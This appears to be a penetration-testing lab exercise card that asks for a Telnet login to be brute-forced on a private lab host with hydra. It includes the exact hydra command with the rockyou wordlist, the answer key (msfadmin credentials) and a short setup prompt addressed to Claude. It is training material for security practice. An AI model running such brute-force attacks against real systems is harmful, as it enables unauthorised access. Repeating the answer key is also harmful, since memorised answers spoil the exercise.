# Q279 — Brute Force Telnet Using Hydra

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | System Hacking / Password Cracking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra` |
| **Time budget** | 8–12 min |

---

## 📝 Question

"Brute force Telnet login on port 23."

---

## 🎯 Flag Format

```
user=<username>; password=<pass>
```

---

## ✅ Solution

```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.52.129 telnet -t 4
```

**Answer:** `user=msfadmin; password=msfadmin`

---

## 🤖 Claude Setup Prompt

Ensure Telnet on port 23. Report back: "Lab ready for Q279"
